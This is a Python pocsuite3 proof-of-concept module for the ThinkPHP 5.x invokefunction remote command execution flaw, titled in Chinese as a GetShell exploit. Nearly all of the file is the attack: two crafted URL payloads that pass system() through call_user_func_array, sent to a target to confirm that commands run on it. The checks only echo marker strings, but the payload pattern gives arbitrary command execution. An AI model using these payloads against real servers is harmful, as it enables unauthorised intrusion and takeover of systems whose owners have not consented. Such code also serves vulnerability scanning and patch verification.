from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
import requests


class TestPOC(POCBase):

	vulID = '0'
	name = 'ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 远程命令执行漏洞利用（GetShell）'
	appName = 'Thinkphp'
	appVersion = '5.0'
	desc = '这是测试'
	def _verify(self):

			result = {}
			
			payload1 = r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20'watch_dog'"
			payload2 = r"/s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20\"echo(%27dede_clown%27);\""
			url = self.url+payload1
			try:
				print(url)
				r = requests.get(url)
				if r.text:
					if 'watch_dog' in r.text:
							url = self.url+payload2
							r2 = requests.get(url)
							if 'dede_clown' in r2.text:
								print("success")
								result['VerifyInfo'] = {}
								result['VerifyInfo']['URL'] = url
								result['VerifyInfo']['Referer'] = payload1					
			except Exception as e:
						print(e)
						pass
							
			return self.parse_output(result)
						
	def parse_output(self, result):

			output = Output(self)
			if result:
				output.success(result)
			else:
				output.fail('target is not vulnerable')

			return output

	
	def _attack(self):
			return self._verify()

register_poc(TestPOC)
		
		
